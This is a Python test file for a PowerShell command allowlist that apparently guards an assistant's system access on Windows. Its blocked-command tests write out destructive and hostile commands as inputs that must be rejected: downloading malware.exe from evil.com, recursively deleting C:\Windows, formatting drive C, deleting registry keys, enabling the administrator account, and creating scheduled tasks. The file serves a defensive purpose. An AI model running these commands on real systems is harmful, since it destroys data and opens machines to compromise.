"""
tests/test_security.py — Allowlist security tests
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from main_humphi import is_allowed


# ── Allowed Commands ──────────────────────────────────────────────────────────

def test_allowed_start_process():
    assert is_allowed("Start-Process ms-settings:network-wifi") == True

def test_allowed_get_process():
    assert is_allowed("Get-Process | Select-Object Name,CPU") == True

def test_allowed_test_netconnection():
    assert is_allowed("Test-NetConnection -ComputerName google.com") == True

def test_allowed_get_pnpdevice():
    assert is_allowed("Get-PnpDevice -Class Bluetooth") == True

def test_allowed_get_service():
    assert is_allowed("Get-Service bthserv") == True


# ── Blocked Commands ──────────────────────────────────────────────────────────

def test_blocked_remove_item():
    assert is_allowed("Remove-Item -Recurse C:\\Windows") == False

def test_blocked_invoke_webrequest():
    assert is_allowed("Invoke-WebRequest https://evil.com/malware.exe") == False

def test_blocked_reg_delete():
    assert is_allowed("reg delete HKLM\\Software\\Important /f") == False

def test_blocked_format_volume():
    assert is_allowed("Format-Volume -DriveLetter C") == False

def test_blocked_net_user():
    assert is_allowed("net user administrator /active:yes") == False

def test_blocked_new_scheduledtask():
    assert is_allowed("New-ScheduledTask -Action $action") == False


# ── Edge Cases ────────────────────────────────────────────────────────────────

def test_empty_command():
    assert is_allowed("") == False

def test_pipe_to_allowed():
    """Piped commands with allowed base should pass."""
    assert is_allowed("Get-Process | Sort-Object CPU -Descending") == True

def test_allowed_exe_taskmgr():
    assert is_allowed("Start-Process taskmgr.exe") == True

def test_allowed_exe_msinfo():
    assert is_allowed("Start-Process msinfo32.exe") == True

def test_blocked_raw_exe():
    """Running an exe directly (without Start-Process) should be blocked."""
    assert is_allowed("malware.exe --payload") == False

def test_blocked_invoke_expression():
    assert is_allowed("Invoke-Expression 'rm -rf /'") == False
